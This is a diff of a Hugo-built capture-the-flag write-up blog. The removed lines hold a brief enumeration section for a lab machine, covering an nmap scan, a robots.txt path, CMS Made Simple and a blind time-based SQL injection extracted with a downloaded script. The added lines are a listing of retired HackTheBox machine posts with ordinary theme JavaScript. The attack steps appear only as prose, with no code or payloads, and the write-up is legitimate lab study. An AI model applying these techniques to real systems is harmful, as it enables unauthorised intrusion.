-            <p style="display:block; width:100%; max-width:100%; margin:0; opacity:0.8; white-space:normal; overflow-wrap:break-word; word-wrap:break-word; word-break:break-word; hyphens:auto; box-sizing:border-box;">
-              <h2 id="enumeration">Enumeration</h2>
-<ul>
-<li>nmap scan found ssh and http open</li>
-<li>First we notice that the author says there is a DoS protection script running</li>
-<li>And we have his email so we know the domain to add to etc/hosts</li>
-<li>I tried gobuster on t 3 and got banned so i have to reset the machine</li>
-<li>nmap showed there is a directory blocked in robots.txt /writeup</li>
-<li>opened it and it runs with cms made simple in 2019, i found its config file and thus its version</li>
-<li>Looked and found a blind time based sql injection vulnerability
-<ul>
-<li>Pretty much it passes an argument and if it&rsquo;s true then the site executes TIME(5) to take it 5 sec to load</li>
-<li>so i downloaded a script that goes through one by one each letter of the password and user to get the right letters</li>
-</ul>
-</li>
-<li></li>
-</ul>
-            </p>
-          
-        </a>
-      
-    </div>
-  </section>
-
-    </main>
-    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
-  <div class="flex justify-between">
-  <a class="f4 fw4 hover-white white-70 dn dib-ns pv2 ph3 no-underline" href="http://localhost:1313/" >
-    &copy;  Khonshu Writeups 2026 
-  </a>
-    <div><div class="ananke-socials"></div>
 </div>
-  </div>
-</footer>
 
-  </body>
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">BoardLight (Linux Easy)
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Retired machine</p>
+  </div>
+  <footer class="entry-footer"><span>2 min</span>&nbsp;·&nbsp;<span>311 words</span></footer>
+  <a class="entry-link" aria-label="post link to BoardLight (Linux Easy)" href="http://localhost:1313/Kh0nshu/hackthebox/retired-machines/boardlight-linux-easy/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Cap (Linux Easy)
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Retired machine</p>
+  </div>
+  <footer class="entry-footer"><span>1 min</span>&nbsp;·&nbsp;<span>181 words</span></footer>
+  <a class="entry-link" aria-label="post link to Cap (Linux Easy)" href="http://localhost:1313/Kh0nshu/hackthebox/retired-machines/cap-linux-easy/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Cicada (Windows Easy)
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Retired machine</p>
+  </div>
+  <footer class="entry-footer"><span>3 min</span>&nbsp;·&nbsp;<span>553 words</span></footer>
+  <a class="entry-link" aria-label="post link to Cicada (Windows Easy)" href="http://localhost:1313/Kh0nshu/hackthebox/retired-machines/cicada-windows-easy/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="next" href="http://localhost:1313/Kh0nshu/hackthebox/page/2/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/Kh0nshu/">Khonshu Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
 </html>
